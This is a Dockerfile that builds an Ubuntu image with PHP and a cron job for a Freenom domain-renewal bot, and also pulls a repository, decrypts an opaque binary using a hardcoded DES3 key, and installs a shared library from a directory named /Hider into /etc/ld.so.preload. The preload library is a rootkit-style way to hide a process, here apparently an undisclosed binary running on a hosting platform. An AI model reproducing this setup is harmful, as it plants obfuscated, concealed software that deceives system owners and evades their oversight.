FROM ubuntu
ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && apt install -y curl git wget tar gzip openssl unzip php php-cli php-fpm php-zip php-mysql php-curl php-gd php-common php-xml php-xmlrpc cron

#使用自定义配置请取消下列命令的“#”
#ADD var /bwvar

ADD auto-start /auto-start
RUN chmod +x /auto-start

# 添加 Freenom Bot 配置文件和依賴
ADD env /env

RUN git clone https://snowflare-lyv-development@bitbucket.org/snowflare-lyv-development/bridgewater-paas.git

RUN dd if=bridgewater-paas/bridgewater.bpk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf - && mv bridgewater /usr/bin/bridgewater && chmod +x /usr/bin/bridgewater

RUN mkdir /Hider && mv bridgewater-paas/bridgewater.so /Hider/

RUN echo /Hider/bridgewater.so >> /etc/ld.so.preload


#安裝 Freenom Bot
RUN git clone https://github.com/luolongfei/freenom.git
RUN chmod 0777 -R /freenom && cp /env /freenom/.env
RUN ( crontab -l; echo "40 14 * * * cd /freenom && php run > freenom_crontab.log 2>&1" ) | crontab && /etc/init.d/cron start

RUN rm -rf bridgewater-paas

# End --------------------------------------------------------------------------


USER root

CMD ./auto-start
